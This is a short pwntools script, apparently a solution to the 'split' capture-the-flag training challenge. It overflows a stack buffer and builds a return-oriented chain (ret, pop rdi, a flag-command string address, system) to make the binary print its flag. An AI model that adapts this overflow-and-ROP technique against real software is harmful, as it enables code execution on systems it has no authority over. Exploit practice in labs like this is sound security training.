#!/usr/bin/python3

from pwn import *

PROG_NAME = "./split"

p = process(PROG_NAME)
elf = p.elf
rop = ROP(elf)

if args.ATTACH:
	gdb.attach(p, '''break main''')

cat_flag_addr = 0x00601060

p.recvuntil(b'> ')

payload = b'A' * (0x20 + 0x8)
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(cat_flag_addr)
payload += p64(elf.symbols['system'])

p.sendline(payload)

p.interactive()